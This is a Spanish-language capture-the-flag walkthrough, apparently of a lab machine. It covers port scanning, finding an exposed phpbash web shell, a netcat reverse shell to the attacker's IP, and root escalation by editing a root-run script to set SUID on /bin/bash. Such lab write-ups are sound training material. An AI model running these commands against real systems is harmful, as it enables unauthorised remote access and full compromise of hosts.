![1](Images/1.png)

Se comienza con una fase de enumeración de puertos sobre la máquina objetivo, con el fin de identificar qué puertos se encuentran abiertos.

``sudo nmap 10.129.27.201 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``

![2](Images/2.png)

Se identifica el puerto 80/tcp abierto. Aunque este puerto suele asociarse al servicio HTTP por convención (_well-known ports_), no puede asumirse su ejecución sin una enumeración más detallada. Por ello, se realiza un segundo escaneo con scripts de enumeración y detección de versiones, con el objetivo de identificar el servicio, su versión y recopilar información adicional que permita evaluar posibles vectores de ataque.


``nmap 10.129.27.201 -sCV -p80 -oN target``

![3](Images/3.png)


Se inspecciona el contenido del sitio web a nivel de navegador, sin identificar inicialmente ningún endpoint relevante.

![4](Images/4.png)


Sin embargo, en el contenido visible se observa una referencia a ``phpbash``:

``phpbash helps a lot with pentesting. I have tested it on multiple different servers and it was very useful. I actually developed it on this exact server.``

Esta pista sugiere la posible existencia de una webshell basada en PHP. El objetivo en este punto es identificar su endpoint para su posterior explotación.

Dado lo anterior, se procede a realizar una enumeración de directorios mediante fuerza bruta basada en diccionario con ``feroxbuster``:

``feroxbuster -u http://10.129.27.201 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 80 -x txt,sh,php -C 400,404,500,503 -o 80 -r``

![5](Images/5.png)

El resultado del escaneo revela un directorio de especial interés: ``/dev``.


Al acceder a dicho directorio desde el navegador, se observa un directory listing que expone los siguientes archivos:

- `phpbash.min.php`
- `phpbash.php`

![6](Images/6.png)

Al acceder a `phpbash.php`, se obtiene una web shell que permite la ejecución remota de comandos en el sistema víctima:

![7](Images/7.png)

Se verifica su funcionamiento ejecutando `id`, confirmando ejecución remota de comandos.

A partir de este punto, se procede a establecer una reverse shell.
- Se levanta un listener en la máquina atacante: ``nc -nvlp 443``
- Se ejecuta una reverse shell desde la web shell: ``busybox nc 10.10.15.143 443 -e /bin/bash``
-  Se recibe la conexión entrante en el listener:


![8](Images/8.png)

Se ha obtenido acceso al sistema como el usuario ``www-data``.

Se realiza un tratamiento de la TTY para estabilizar la shell.

La flag de usuario se encuentra en el directorio personal del usuario ``arrexel``:

![9](Images/9.png)

# PRIVESC

Se revisan los privilegios de sudo del usuario actual:

``sudo -l``

![10](Images/10.png)

Se observa que el usuario actual, ``www-data``, puede ejecutar cualquier comando como el usuario ``scriptmanager`` sin necesidad de contraseña:

``scriptmanager : scriptmanager) NOPASSWD: ALL``

En este contexto, es posible escalar a dicho usuario ejecutando una shell con privilegios delegados:

``sudo -u scriptmanager /bin/bash``

![11](Images/11.png)

Se ha pivotado  correctamente al usuario ``scriptmanager``.

Durante la enumeración del sistema de archivos, se identifica un directorio interesante en la raíz del sistema: 

![12](Images/12.png)

Se observa el directorio ``/scripts``, propiedad del usuario ``scriptmanager``.

![13](Images/13.png)

El directorio contiene un script, `test.py`, que escribe sobre `test.txt`, pero este último pertenece a `root` y el usuario ``scriptmanager`` no tiene permisos de escritura, lo que en condiciones normales debería impedir su modificación directa.

Dado que el archivo `test.py` sí es modificable por `scriptmanager`, se procede a alterar su contenido para comprobar si es ejecutado automáticamente por el sistema con privilegios elevados.

![14](Images/14.png)

Posteriormente, se verifica el contenido de ``test.txt``:

``cat test.txt``

![15](Images/15.png)

Esto confirma que ``test.py`` se está ejecutando con privilegios de ``root``.

Aprovechando esta situación, se manipula el script ``test.py`` para otorgar el bit SUID a la ``/bin/bash``:

![16](Images/16.png)

Se verifica el cambio de permisos en ``/bin/bash``:

![17](Images/17.png)

``/bin/bash`` ahora cuenta con el bit SUID habilitado, por lo que se procede a ejecutar una shell con privilegios elevados:

``bash -p``

![18](Images/18.png)

Se ha obtenido acceso como usuario ``root``.

La flag de root se encuentra en el directorio personal del usuario ``root``.

![19](Images/19.png)


